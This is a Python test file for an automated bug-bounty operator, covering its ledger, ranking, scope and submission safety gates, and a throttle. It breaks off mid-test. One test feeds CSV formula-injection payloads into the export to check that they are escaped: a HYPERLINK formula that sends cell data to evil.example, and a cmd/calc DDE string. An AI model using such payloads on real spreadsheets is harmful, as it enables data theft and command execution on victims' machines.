"""Tests for the autonomous operator core: portfolio store, finding ledger
(cross-run dedup + funnel), EV ranking, and the run-cycle's submit safety gates."""
from __future__ import annotations

import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path

BACKEND_DIR = Path(__file__).resolve().parent
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

from bughunter import ledger, operator, portfolio, ranking  # noqa: E402
from bughunter.operator import OperatorLoop  # noqa: E402


class PortfolioTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.rt = self._tmp.name

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_upsert_and_get(self) -> None:
        p = portfolio.upsert_program(self.rt, {"name": "Acme", "scope_text": "*.acme.com", "seed_targets": ["https://acme.com"]})
        self.assertTrue(p["id"])
        self.assertEqual(portfolio.get_program(self.rt, p["id"])["name"], "Acme")

    def test_empty_scope_fails_closed(self) -> None:
        # No scope -> active/live/auto_submit forced off (an empty scope no-ops the gate).
        p = portfolio.upsert_program(self.rt, {"name": "NoScope", "active": True, "auto_submit": True})
        self.assertFalse(p["active"])
        self.assertFalse(p["auto_submit"])

    def test_deep_implies_active_and_requires_scope(self) -> None:
        # Deep on with scope -> deep stays on AND active is forced on (deep implies proof).
        p = portfolio.upsert_program(self.rt, {"name": "D", "scope_text": "d.com", "deep": True, "active": False})
        self.assertTrue(p["deep"])
        self.assertTrue(p["active"])
        # Deep with no scope -> forced off (fail-closed, like active/live).
        p2 = portfolio.upsert_program(self.rt, {"name": "NoScopeDeep", "deep": True})
        self.assertFalse(p2["deep"])

    def test_non_numeric_fields_do_not_crash_the_write(self) -> None:
        # The CLI / a hand-edited portfolio.json / any direct upsert_program caller is
        # not Pydantic-validated like the HTTP API -- a bad value (e.g. max_pages='abc')
        # must degrade to the safe default instead of raising and aborting the write.
        p = portfolio.upsert_program(self.rt, {
            "name": "Bad", "scope_text": "bad.com",
            "max_pages": "abc", "interval_minutes": "soon", "max_submits_per_day": None,
        })
        self.assertEqual(p["max_pages"], 12)
        self.assertEqual(p["interval_minutes"], 1440)
        self.assertEqual(p["max_submits_per_day"], 3)

    def test_auto_submit_requires_handle(self) -> None:
        p = portfolio.upsert_program(self.rt, {"name": "X", "scope_text": "x.com", "auto_submit": True, "platform": "manual"})
        self.assertFalse(p["auto_submit"])  # no hackerone handle -> can't auto-submit
        p2 = portfolio.upsert_program(self.rt, {"name": "Y", "scope_text": "y.com", "auto_submit": True,
                                                "platform": "hackerone", "platform_handle": "yteam"})
        self.assertTrue(p2["auto_submit"])


def _finding(ref, cls, rule, loc, sev="high", proof="confirmed", cvss=8.0):
    return {"ref": ref, "class_id": cls, "rule_id": rule, "location": loc, "severity": sev,
            "title": f"{cls} at {loc}", "proof_status": proof}


def _item(ref, cls, rule, loc, sev="high", proof="confirmed", cvss=8.0):
    return {"finding": _finding(ref, cls, rule, loc, sev, proof), "source_url": loc,
            "proof_status": proof, "cvss": {"base_score": cvss}, "source_json": ""}


class LedgerTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.rt = self._tmp.name

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_dedup_key_stable_across_digit_change(self) -> None:
        a = ledger.dedup_key(_finding("F1", "xss", "r", "https://x/a/123"))
        b = ledger.dedup_key(_finding("F2", "xss", "r", "https://x/a/456"))
        self.assertEqual(a, b)  # digits normalized to N

    def test_upsert_marks_duplicate_after_reported(self) -> None:
        items = [_item("C1", "xss", "r", "https://x/a")]
        ledger.upsert_findings(self.rt, "acme", "https://x", items)
        self.assertFalse(items[0]["duplicate_of_prior"])
        ledger.mark_reported(self.rt, "acme", "https://x", items[0]["finding"])
        # Re-run: same finding is now a prior-reported duplicate.
        items2 = [_item("C1", "xss", "r", "https://x/a")]
        ledger.upsert_findings(self.rt, "acme", "https://x", items2)
        self.assertTrue(items2[0]["duplicate_of_prior"])
        self.assertTrue(ledger.is_duplicate(self.rt, "acme", "https://x", items2[0]["finding"]))

    def test_confirmed_stage_only_on_confirmed_proof(self) -> None:
        ledger.upsert_findings(self.rt, "acme", "https://x", [_item("C1", "xss", "r", "https://x/a", proof="missing")])
        f = ledger.funnel(self.rt, "acme")
        self.assertEqual(f["stages"]["confirmed"], 0)
        self.assertEqual(f["stages"]["discovered"], 1)

    def test_is_submitted_requires_a_real_submission_not_just_reported(self) -> None:
        item = _item("C1", "xss", "r", "https://x/a")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        ledger.mark_reported(self.rt, "acme", "https://x", item["finding"])
        # 'reported' (a local package was built) is NOT a submission — must stay False so
        # the operator's auto-submit gate can still file it.
        self.assertFalse(ledger.is_submitted(self.rt, "acme", "https://x", item["finding"]))
        self.assertTrue(ledger.is_duplicate(self.rt, "acme", "https://x", item["finding"]))  # is_duplicate is the broader check
        ledger.record_submission(self.rt, "acme", "https://x", item["dedup_key"], "R1", "u")
        self.assertTrue(ledger.is_submitted(self.rt, "acme", "https://x", item["finding"]))

    def test_recent_submission_throttle_count(self) -> None:
        item = _item("C1", "xss", "r", "https://x/a")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        ledger.record_submission(self.rt, "acme", "https://x", item["dedup_key"], "R1", "u")
        self.assertEqual(ledger.count_recent_submissions(self.rt, "acme"), 1)

    def test_count_recent_submissions_excludes_stamps_outside_the_window(self) -> None:
        from datetime import UTC, datetime, timedelta
        item = _item("C1", "xss", "r", "https://x/a")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        ledger.record_submission(self.rt, "acme", "https://x", item["dedup_key"], "R1", "u")
        # Force the stamp far outside the 24h window the throttle checks by default.
        data = ledger._load(self.rt)
        rec = data["programs"][ledger.program_key("acme", "https://x")]["findings"][item["dedup_key"]]
        rec["submitted_at"] = (datetime.now(UTC) - timedelta(hours=48)).isoformat()
        rec["updated_at"] = (datetime.now(UTC) - timedelta(hours=48)).isoformat()
        ledger._save(self.rt, data)
        self.assertEqual(ledger.count_recent_submissions(self.rt, "acme", within_hours=24), 0)
        self.assertEqual(ledger.count_recent_submissions(self.rt, "acme", within_hours=72), 1)

    def test_count_recent_submissions_unparseable_stamp_fails_toward_the_throttle(self) -> None:
        # An unparseable submitted_at must COUNT (fail toward throttling, never
        # silently under-count and let the operator over-submit past its daily cap).
        item = _item("C1", "xss", "r", "https://x/a")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        ledger.record_submission(self.rt, "acme", "https://x", item["dedup_key"], "R1", "u")
        data = ledger._load(self.rt)
        rec = data["programs"][ledger.program_key("acme", "https://x")]["findings"][item["dedup_key"]]
        rec["submitted_at"] = "not-a-real-timestamp"
        ledger._save(self.rt, data)
        self.assertEqual(ledger.count_recent_submissions(self.rt, "acme"), 1)

    def test_a_routine_h1_sync_does_not_make_an_old_submission_look_recent(self) -> None:
        # Regression: count_recent_submissions used to filter on updated_at, which
        # advance_stage()/record_h1_sync() bump on EVERY stage transition -- not just
        # the moment of actual filing. A finding submitted long ago, later marked
        # 'paid' by a routine HackerOne status-sync poll (which happens today), was
        # wrongly counted as a submission made in the last 24h, eating into the
        # program's max_submits_per_day throttle for no real new submission.
        from datetime import UTC, datetime, timedelta

        item = _item("C1", "xss", "r", "https://x/a")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        ledger.record_submission(self.rt, "acme", "https://x", item["dedup_key"], "R1", "u")
        # Back-date the ORIGINAL submission to 10 days ago.
        data = ledger._load(self.rt)
        rec = data["programs"][ledger.program_key("acme", "https://x")]["findings"][item["dedup_key"]]
        rec["submitted_at"] = (datetime.now(UTC) - timedelta(days=10)).isoformat()
        rec["updated_at"] = (datetime.now(UTC) - timedelta(days=10)).isoformat()
        ledger._save(self.rt, data)
        self.assertEqual(ledger.count_recent_submissions(self.rt, "acme", within_hours=24), 0)
        # A sync happening TODAY bumps updated_at to now (via record_h1_sync), but must
        # NOT resurrect this 10-day-old submission as "recent".
        [rec] = ledger.submitted_records(self.rt)
        ledger.record_h1_sync(self.rt, rec["pid"], rec["key"], state="resolved", resolved_with_reward=True)
        self.assertEqual(ledger.count_recent_submissions(self.rt, "acme", within_hours=24), 0)

    def test_legacy_record_with_no_submitted_at_falls_back_to_updated_at(self) -> None:
        # A record written before this field existed has no submitted_at at all --
        # must still be counted via its updated_at, not silently dropped.
        item = _item("C1", "xss", "r", "https://x/a")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        ledger.record_submission(self.rt, "acme", "https://x", item["dedup_key"], "R1", "u")
        data = ledger._load(self.rt)
        rec = data["programs"][ledger.program_key("acme", "https://x")]["findings"][item["dedup_key"]]
        rec["submitted_at"] = ""  # simulate a pre-fix record
        ledger._save(self.rt, data)
        self.assertEqual(ledger.count_recent_submissions(self.rt, "acme"), 1)

    def test_advance_stage_never_regresses(self) -> None:
        item = _item("C1", "xss", "r", "https://x/a")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        ledger.record_submission(self.rt, "acme", "https://x", item["dedup_key"], "R1", "u")  # -> 'submitted'
        ledger.advance_stage(self.rt, "acme", "https://x", item["dedup_key"], "confirmed")  # attempted regress
        data = ledger._load(self.rt)
        rec = data["programs"][ledger.program_key("acme", "https://x")]["findings"][item["dedup_key"]]
        self.assertEqual(rec["stage"], "submitted")  # unchanged -- never moved backward

    def test_advance_stage_unknown_stage_name_is_ignored(self) -> None:
        item = _item("C1", "xss", "r", "https://x/a", proof="missing")  # starts at 'discovered'
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        ledger.advance_stage(self.rt, "acme", "https://x", item["dedup_key"], "not-a-real-stage")
        data = ledger._load(self.rt)
        rec = data["programs"][ledger.program_key("acme", "https://x")]["findings"][item["dedup_key"]]
        self.assertEqual(rec["stage"], "discovered")  # untouched

    def test_funnel_whole_portfolio_aggregates_across_programs(self) -> None:
        ledger.upsert_findings(self.rt, "acme", "https://a", [_item("C1", "xss", "r", "https://a/1", proof="confirmed")])
        ledger.upsert_findings(self.rt, "beta", "https://b", [_item("C2", "ssrf", "r", "https://b/1", proof="confirmed")])
        whole = ledger.funnel(self.rt)
        self.assertEqual(whole["portfolio"]["stages"]["confirmed"], 2)
        self.assertEqual(len(whole["programs"]), 2)
        acme_key = ledger.program_key("acme", "https://a")
        self.assertEqual(whole["programs"][acme_key]["stages"]["confirmed"], 1)

    def test_to_csv_rows_single_program(self) -> None:
        ledger.upsert_findings(self.rt, "acme", "https://x", [_item("C1", "xss", "r", "https://x/a", proof="confirmed")])
        ledger.upsert_findings(self.rt, "acme", "https://x", [_item("C2", "ssrf", "r2", "https://x/b", proof="missing")])
        rows = ledger.to_csv_rows(self.rt, "acme", "https://x")
        self.assertEqual(len(rows), 2)
        self.assertEqual({r["class_id"] for r in rows}, {"xss", "ssrf"})
        for r in rows:
            self.assertEqual(r["program"], ledger.program_key("acme", "https://x"))
            self.assertEqual(set(r.keys()), set(ledger.CSV_COLUMNS))

    def test_to_csv_rows_whole_portfolio(self) -> None:
        ledger.upsert_findings(self.rt, "acme", "https://a", [_item("C1", "xss", "r", "https://a/1", proof="confirmed")])
        ledger.upsert_findings(self.rt, "beta", "https://b", [_item("C2", "ssrf", "r", "https://b/1", proof="confirmed")])
        rows = ledger.to_csv_rows(self.rt)
        self.assertEqual(len(rows), 2)
        self.assertEqual({r["program"] for r in rows}, {ledger.program_key("acme", "https://a"), ledger.program_key("beta", "https://b")})

    def test_to_csv_rows_empty_store_returns_empty_list(self) -> None:
        self.assertEqual(ledger.to_csv_rows(self.rt), [])
        self.assertEqual(ledger.to_csv_rows(self.rt, "never-seen"), [])

    def test_to_csv_rows_defangs_formula_leading_titles(self) -> None:
        # A hostile target/program could embed target-controlled text as a finding's
        # title/source_url with no guarantee of a fixed literal prefix. A leading
        # =/+/-/@ must never reach the CSV cell unescaped -- Excel/Sheets/LibreOffice
        # would evaluate it as a formula on open.
        malicious = {
            "finding": {"ref": "C1", "class_id": "xss", "rule_id": "r",
                        "location": "https://x/a", "severity": "high",
                        "title": '=HYPERLINK("http://evil.example/steal?d="&A1,"click")',
                        "proof_status": "confirmed"},
            "source_url": "@SUM(1+1)*cmd|' /C calc'!A0",
            "proof_status": "confirmed", "cvss": {"base_score": 8.0}, "source_json": "",
        }
        ledger.upsert_findings(self.rt, "acme", "https://x", [malicious])
        rows = ledger.to_csv_rows(self.rt, "acme", "https://x")
        self.assertEqual(len(rows), 1)
        row = rows[0]
        self.assertTrue(row["title"].startswith("'="), row["title"])
        self.assertTrue(row["source_url"].startswith("'@"), row["source_url"])

    def test_to_csv_rows_leaves_benign_fields_untouched(self) -> None:
        ledger.upsert_findings(self.rt, "acme", "https://x", [_item("C1", "xss", "r", "https://x/a", proof="confirmed")])
        rows = ledger.to_csv_rows(self.rt, "acme", "https://x")
        self.assertEqual(rows[0]["title"], "xss at https://x/a")
        self.assertEqual(rows[0]["source_url"], "https://x/a")

    def test_submitted_records_only_lists_submitted_with_report_id(self) -> None:
        confirmed_item = _item("C1", "xss", "r", "https://x/a")
        ledger.upsert_findings(self.rt, "acme", "https://x", [confirmed_item])  # stays 'confirmed', no report id
        submitted_item = _item("C2", "ssrf", "r", "https://x/b")
        ledger.upsert_findings(self.rt, "acme", "https://x", [submitted_item])
        ledger.record_submission(self.rt, "acme", "https://x", submitted_item["dedup_key"], "R1", "u")
        records = ledger.submitted_records(self.rt)
        self.assertEqual(len(records), 1)
        self.assertEqual(records[0]["h1_report_id"], "R1")
        self.assertEqual(records[0]["key"], submitted_item["dedup_key"])

    def test_record_h1_sync_updates_state_without_advancing_stage(self) -> None:
        item = _item("C1", "xss", "r", "https://x/a")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        ledger.record_submission(self.rt, "acme", "https://x", item["dedup_key"], "R1", "u")
        [rec] = ledger.submitted_records(self.rt)
        ledger.record_h1_sync(self.rt, rec["pid"], rec["key"], state="triaged", resolved_with_reward=False)
        data = ledger._load(self.rt)
        stored = data["programs"][rec["pid"]]["findings"][rec["key"]]
        self.assertEqual(stored["h1_state"], "triaged")
        self.assertTrue(stored["h1_synced_at"])
        self.assertEqual(stored["stage"], "submitted")  # a bare state change never advances the stage

    def test_record_h1_sync_advances_to_paid_on_reward(self) -> None:
        item = _item("C1", "xss", "r", "https://x/a")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        ledger.record_submission(self.rt, "acme", "https://x", item["dedup_key"], "R1", "u")
        [rec] = ledger.submitted_records(self.rt)
        ledger.record_h1_sync(self.rt, rec["pid"], rec["key"], state="resolved", resolved_with_reward=True)
        data = ledger._load(self.rt)
        stored = data["programs"][rec["pid"]]["findings"][rec["key"]]
        self.assertEqual(stored["stage"], "paid")
        self.assertEqual(stored["h1_state"], "resolved")

    def test_submitted_records_excludes_already_terminal_states(self) -> None:
        # Once a record is synced to a terminal state, submitted_records must stop
        # surfacing it — a repeat sync should never re-poll a closed report.
        item = _item("C1", "xss", "r", "https://x/a")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        ledger.record_submission(self.rt, "acme", "https://x", item["dedup_key"], "R1", "u")
        [rec] = ledger.submitted_records(self.rt)
        ledger.record_h1_sync(self.rt, rec["pid"], rec["key"], state="duplicate", resolved_with_reward=False)
        self.assertEqual(ledger.submitted_records(self.rt), [])

    def test_submitted_records_capped_and_sorted_most_recent_first(self) -> None:
        # Distinct rule ids (not just digits in the path) so each finding gets its own
        # dedup key -- digits alone normalize to N and would collapse to one key.
        for i, rule in enumerate(["xss.a", "xss.b", "xss.c"]):
            item = _item(f"C{i}", "xss", rule, "https://x/path")
            ledger.upsert_findings(self.rt, "acme", "https://x", [item])
            ledger.record_submission(self.rt, "acme", "https://x", item["dedup_key"], f"R{i}", "u")
        records = ledger.submitted_records(self.rt, limit=2)
        self.assertEqual(len(records), 2)


class PortfolioLifecycleTests(unittest.TestCase):
    """portfolio.remove_program / set_enabled / touch_run had no test coverage at all."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.rt = self._tmp.name

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_remove_program_deletes_and_reports_success(self) -> None:
        p = portfolio.upsert_program(self.rt, {"name": "Acme", "scope_text": "acme.com"})
        self.assertTrue(portfolio.remove_program(self.rt, p["id"]))
        self.assertIsNone(portfolio.get_program(self.rt, p["id"]))

    def test_remove_program_unknown_id_returns_false(self) -> None:
        self.assertFalse(portfolio.remove_program(self.rt, "does-not-exist"))

    def test_set_enabled_toggles_and_persists(self) -> None:
        p = portfolio.upsert_program(self.rt, {"name": "Acme", "scope_text": "acme.com"})
        self.assertTrue(p["enabled"])
        updated = portfolio.set_enabled(self.rt, p["id"], False)
        self.assertFalse(updated["enabled"])
        self.assertFalse(portfolio.get_program(self.rt, p["id"])["enabled"])

    def test_set_enabled_unknown_id_returns_none(self) -> None:
        self.assertIsNone(portfolio.set_enabled(self.rt, "does-not-exist", True))

    def test_touch_run_stamps_last_and_next_run(self) -> None:
        p = portfolio.upsert_program(self.rt, {"name": "Acme", "scope_text": "acme.com"})
        self.assertIsNone(p["last_run_at"])
        portfolio.touch_run(self.rt, p["id"], next_run_at="2099-01-01T00:00:00+00:00")
        updated = portfolio.get_program(self.rt, p["id"])
        self.assertIsNotNone(updated["last_run_at"])
        self.assertEqual(updated["next_run_at"], "2099-01-01T00:00:00+00:00")

    def test_touch_run_unknown_id_does_not_raise(self) -> None:
        portfolio.touch_run(self.rt, "does-not-exist", next_run_at="2099-01-01T00:00:00+00:00")  # must not raise


class IsDueTests(unittest.TestCase):
    """_is_due must never raise -- an exception here escapes the list comprehension in
    _supervise() and kills the WHOLE operator supervisor thread (every program stops being
    scheduled), not just the one malformed program."""

    def setUp(self) -> None:
        self.loop = OperatorLoop("unused", run_campaign_fn=lambda *a, **k: {}, submit_fn=lambda *a, **k: {})

    def test_naive_timestamp_does_not_raise_and_counts_as_due(self) -> None:
        # No timezone offset -> comparing to datetime.now(UTC) raises TypeError, not
        # ValueError -- must be caught and treated as due (fail toward scheduling it).
        self.assertTrue(self.loop._is_due({"next_run_at": "2026-07-01T10:00:00"}))

    def test_garbage_string_does_not_raise_and_counts_as_due(self) -> None:
        self.assertTrue(self.loop._is_due({"next_run_at": "not-a-date"}))

    def test_missing_next_run_at_is_due(self) -> None:
        self.assertTrue(self.loop._is_due({}))

    def test_future_aware_timestamp_is_not_due(self) -> None:
        from datetime import UTC, datetime, timedelta
        future = (datetime.now(UTC) + timedelta(days=1)).isoformat()
        self.assertFalse(self.loop._is_due({"next_run_at": future}))


class RankingTests(unittest.TestCase):
    def test_confirmed_outranks_unconfirmed_despite_pay_factor(self) -> None:
        confirmed = _item("A", "xss", "r", "x", sev="low", proof="confirmed", cvss=2.0)
        unconfirmed = _item("B", "rce", "r", "y", sev="critical", proof="missing", cvss=9.8)
        # Even a critical unconfirmed with a paying class must NOT outrank a confirmed.
        program_stats = {"rce": {"submitted": 5, "rewarded": 5, "noise": 0, "bounty_total": 5000.0}}
        ranked = ranking.rank_by_ev([unconfirmed, confirmed], {}, program_stats)
        self.assertEqual(ranked[0]["finding"]["ref"], "A")  # confirmed first

    def test_ev_factors_bounded(self) -> None:
        item = _item("A", "xss", "r", "x", proof="confirmed", cvss=8.0)
        ev = ranking.expected_value(item, {"xss": 99.0}, {"xss": {"rewarded": 99, "noise": 0, "bounty_total": 1e9, "submitted": 99}})
        self.assertLessEqual(ev["breakdown"]["prior"], 2.0)
        self.assertLessEqual(ev["breakdown"]["program_pay_factor"], 2.0)

    def test_pay_factor_unadjudicated_with_a_paid_bounty_gets_the_small_bonus(self) -> None:
        # adjudicated (rewarded+noise) == 0 but bounty_total > 0 is a real, if odd, state
        # (e.g. a bounty recorded before the outcome was adjudicated) -- it should get the
        # SMALL "paid" bonus (1.2), not the full reward-rate-driven multiplier.
        stats = {"xss": {"rewarded": 0, "noise": 0, "bounty_total": 500.0}}
        self.assertAlmostEqual(ranking._program_pay_factor("xss", stats), 1.2)

    def test_pay_factor_unadjudicated_no_bounty_is_neutral(self) -> None:
        stats = {"xss": {"rewarded": 0, "noise": 0, "bounty_total": 0.0}}
        self.assertAlmostEqual(ranking._program_pay_factor("xss", stats), 1.0)

    def test_pay_factor_all_noise_clamps_to_the_floor(self) -> None:
        # rewarded=0, noise=10 -> score=-1.0 -> 1.0 + 0.8*(-1.0) = 0.2, clamped to the 0.5 floor.
        stats = {"xss": {"rewarded": 0, "noise": 10, "bounty_total": 0.0}}
        self.assertAlmostEqual(ranking._program_pay_factor("xss", stats), 0.5)

    def test_pay_factor_all_rewarded_clamps_to_the_ceiling(self) -> None:
        stats = {"xss": {"rewarded": 10, "noise": 0, "bounty_total": 1000.0}}
        self.assertAlmostEqual(ranking._program_pay_factor("xss", stats), 2.0)

    def test_pay_factor_no_stats_for_class_is_neutral(self) -> None:
        self.assertEqual(ranking._program_pay_factor("xss", {}), 1.0)
        self.assertEqual(ranking._program_pay_factor("xss", None), 1.0)

    def test_corrupted_class_stats_does_not_crash_the_campaign(self) -> None:
        # A hand-edited/corrupted runtime learning JSON (non-numeric rewarded/noise/
        # bounty_total) must degrade gracefully -- rank_by_ev is called unguarded
        # mid-campaign, so a ValueError here would abort the whole run.
        item = _item("A", "xss", "r", "x", proof="confirmed", cvss=8.0)
        corrupted_stats = {"xss": {"rewarded": "lots", "noise": None, "bounty_total": "lots-of-cash", "submitted": "many"}}
        ev = ranking.expected_value(item, {"xss": "not-a-number"}, corrupted_stats)
        self.assertIsInstance(ev["ev"], float)
        ranked = ranking.rank_by_ev([dict(item)], {"xss": "not-a-number"}, corrupted_stats)
        self.assertEqual(len(ranked), 1)  # completes without raising


class OperatorCycleTests(unittest.TestCase):
    """The submit safety gates: review-only never submits; armed+opt-in+confirmed does;
    dedup blocks re-file; the per-day throttle caps; the kill switch halts."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.rt = self._tmp.name
        self.submits: list[tuple[str, str]] = []

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def _program(self, **kw):
        base = {"id": "acme", "scope_text": "*.acme.com", "seed_targets": ["https://acme.com"],
                "active": True, "auto_submit": True, "platform": "hackerone", "platform_handle": "acme",
                "max_submits_per_day": 3, "max_pages": 8, "interval_minutes": 1440}
        base.update(kw)
        return base

    def _run_campaign_fn(self, target, *, scope, program, active, live, deep=False, max_pages=12):
        self.last_deep = deep  # record so a test can assert deep was threaded through
        # One confirmed finding per run.
        f = _finding("C1", "xss", "active.reflected-xss", f"{target}/?q=", proof="confirmed")
        # ledger.upsert_findings normally runs inside run_campaign — simulate it here.
        ledger.upsert_findings(self.rt, program, target, [{"finding": f, "source_url": f["location"],
                                                           "proof_status": "confirmed", "cvss": {"base_score": 6.1}}])
        return {"ok": True, "run_id": "run-1", "findings": [f], "proof_of_impact": {"C1": {"status": "confirmed"}}}

    def _submit_fn(self, run_id, ref):
        self.submits.append((run_id, ref))
        return {"ok": True, "report_id": f"R{len(self.submits)}", "url": "https://h1/r"}

    def test_review_only_never_submits(self) -> None:
        # submit_fn=None => review-only, even though the program opts into auto_submit.
        s = operator.run_program_cycle(self.rt, self._program(), run_campaign_fn=self._run_campaign_fn, submit_fn=None)
        self.assertEqual(self.submits, [])
        self.assertEqual(s["confirmed"], 1)

    def test_deep_flag_is_threaded_to_the_campaign(self) -> None:
        self.last_deep = None
        operator.run_program_cycle(self.rt, self._program(deep=True), run_campaign_fn=self._run_campaign_fn, submit_fn=None)
        self.assertTrue(self.last_deep)   # the program's deep flag reached run_campaign_fn
        self.last_deep = None
        operator.run_program_cycle(self.rt, self._program(deep=False), run_campaign_fn=self._run_campaign_fn, submit_fn=None)
        self.assertFalse(self.last_deep)

    def test_armed_auto_submit_files_confirmed(self) -> None:
        s = operator.run_program_cycle(self.rt, self._program(), run_campaign_fn=self._run_campaign_fn, submit_fn=self._submit_fn)
        self.assertEqual(len(self.submits), 1)
        self.assertEqual(s["submitted"], 1)

    def test_armed_auto_submit_files_even_after_campaign_marks_reported(self) -> None:
        # The REAL campaign.py marks a confirmed finding 'reported' (ledger.mark_reported)
        # the SAME cycle it builds a local submission package — before run_program_cycle
        # ever gets to check the ledger. The auto-submit gate must key off is_submitted
        # (stage >= submitted), not is_duplicate (stage >= reported, which mark_reported
        # alone already satisfies) — otherwise auto-submit could never file anything.
        def run_fn(target, *, scope, program, active, live, deep=False, max_pages=12):
            f = _finding("C1", "xss", "active.reflected-xss", f"{target}/?q=", proof="confirmed")
            ledger.upsert_findings(self.rt, program, target, [{"finding": f, "source_url": f["location"],
                                                               "proof_status": "confirmed", "cvss": {"base_score": 6.1}}])
            ledger.mark_reported(self.rt, program, target, f)  # simulates building the submission package
            return {"ok": True, "run_id": "run-1", "findings": [f], "proof_of_impact": {"C1": {"status": "confirmed"}}}
        s = operator.run_program_cycle(self.rt, self._program(), run_campaign_fn=run_fn, submit_fn=self._submit_fn)
        self.assertEqual(len(self.submits), 1)
        self.assertEqual(s["submitted"], 1)

    def test_dedup_blocks_refile_on_second_cycle(self) -> None:
        op = dict(self._program())
        operator.run_program_cycle(self.rt, op, run_campaign_fn=self._run_campaign_fn, submit_fn=self._submit_fn)
        operator.run_program_cycle(self.rt, op, run_campaign_fn=self._run_campaign_fn, submit_fn=self._submit_fn)
        self.assertEqual(len(self.submits), 1)  # the second cycle's identical finding is a dup -> not re-filed

    def test_throttle_caps_per_day(self) -> None:
        # Five distinct confirmed findings, cap of 2/day -> only 2 filed.
        calls = {"n": 0}
        def many_fn(target, *, scope, program, active, live, deep=False, max_pages=12):
            calls["n"] += 1
            f = _finding(f"C{calls['n']}", "xss", "active.reflected-xss", f"{target}/p{calls['n']}", proof="confirmed")
            ledger.upsert_findings(self.rt, program, target, [{"finding": f, "source_url": f["location"], "proof_status": "confirmed", "cvss": {"base_score": 6.1}}])
            return {"ok": True, "run_id": "r", "findings": [f], "proof_of_impact": {f["ref"]: {"status": "confirmed"}}}
        prog = self._program(max_submits_per_day=2, seed_targets=["https://a", "https://b", "https://c", "https://d", "https://e"])
        operator.run_program_cycle(self.rt, prog, run_campaign_fn=many_fn, submit_fn=self._submit_fn)
        self.assertEqual(len(self.submits), 2)

    def test_run_campaign_fn_raising_is_recorded_and_does_not_kill_the_cycle(self) -> None:
        def boom(target, *, scope, program, active, live, deep=False, max_pages=12):
            raise RuntimeError("simulated campaign crash")
        prog = self._program(seed_targets=["https://a", "https://b"])
        s = operator.run_program_cycle(self.rt, prog, run_campaign_fn=boom, submit_fn=self._submit_fn)
        self.assertEqual(s["targets_run"], 0)
        self.assertEqual(len(s["errors"]), 2)  # one error per target, both recorded
        self.assertIn("RuntimeError", s["errors"][0])
        self.assertEqual(self.submits, [])

    def test_campaign_ok_false_is_recorded_as_an_error_not_raised(self) -> None:
        def failing(target, *, scope, program, active, live, deep=False, max_pages=12):
            return {"ok": False, "error": "not authorized"}
        s = operator.run_program_cycle(self.rt, self._program(), run_campaign_fn=failing, submit_fn=self._submit_fn)
        self.assertEqual(s["targets_run"], 0)
        self.assertEqual(len(s["errors"]), 1)
        self.assertIn("not authorized", s["errors"][0])

    def test_finding_missing_ref_is_tolerated(self) -> None:
        def run_fn(target, *, scope, program, active, live, deep=False, max_pages=12):
            f = {"class_id": "xss", "rule_id": "r", "location": target, "severity": "high", "title": "x"}  # no 'ref'
            return {"ok": True, "run_id": "run-1", "findings": [f], "proof_of_impact": {}}
        s = operator.run_program_cycle(self.rt, self._program(), run_campaign_fn=run_fn, submit_fn=self._submit_fn)
        self.assertEqual(s["targets_run"], 1)
        self.assertEqual(s["findings"], 1)
        self.assertEqual(s["confirmed"], 0)  # proof_of_impact.get(None) -> not confirmed, no crash
        self.assertEqual(self.submits, [])

    def test_empty_seed_targets_is_a_clean_no_op(self) -> None:
        prog = self._program(seed_targets=[])
        s = operator.run_program_cycle(self.rt, prog, run_campaign_fn=self._run_campaign_fn, submit_fn=self._submit_fn)
        self.assertEqual(s["targets_run"], 0)
        self.assertEqual(s["findings"], 0)
        self.assertEqual(s["errors"], [])
        self.assertEqual(self.submits, [])

    def test_submit_fn_failure_is_recorded_without_advancing_the_ledger(self) -> None:
        def failing_submit(run_id, ref):
            return {"ok": False, "error": "HackerOne rejected the report"}
        s = operator.run_program_cycle(self.rt, self._program(), run_campaign_fn=self._run_campaign_fn, submit_fn=failing_submit)
        self.assertEqual(s["submitted"], 0)
        self.assertEqual(len(s["errors"]), 1)
        self.assertIn("HackerOne rejected", s["errors"][0])
        # A failed submit must NOT mark the finding submitted -- it must still be
        # eligible to retry on the next cycle.
        self.assertFalse(ledger.is_submitted(self.rt, "acme", "https://acme.com",
                          _finding("C1", "xss", "active.reflected-xss", "https://acme.com/?q=", proof="confirmed")))


class SupervisorLoopTests(unittest.TestCase):
    """OperatorLoop._supervise's idle-tick (no due programs) and kill-switch-between-
    programs paths had no test coverage -- both exercised here via the REAL loop running
    in a background thread against a real (temp-dir) portfolio store."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.rt = self._tmp.name

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_idle_tick_wait_responds_to_the_stop_event_not_the_full_timeout(self) -> None:
        # Zero programs -> due=[] every pass -> _supervise calls
        # self.stop_event.wait(timeout=15). Setting the event from another thread must
        # wake it well before the 15s timeout, proving the idle tick is responsive.
        loop = OperatorLoop(self.rt, run_campaign_fn=lambda *a, **k: {}, submit_fn=lambda *a, **k: {})
        thread = threading.Thread(target=loop._supervise, daemon=True)
        start = time.monotonic()
        thread.start()
        time.sleep(0.05)  # let it enter the idle wait
        loop.stop_event.set()
        thread.join(timeout=5)
        elapsed = time.monotonic() - start
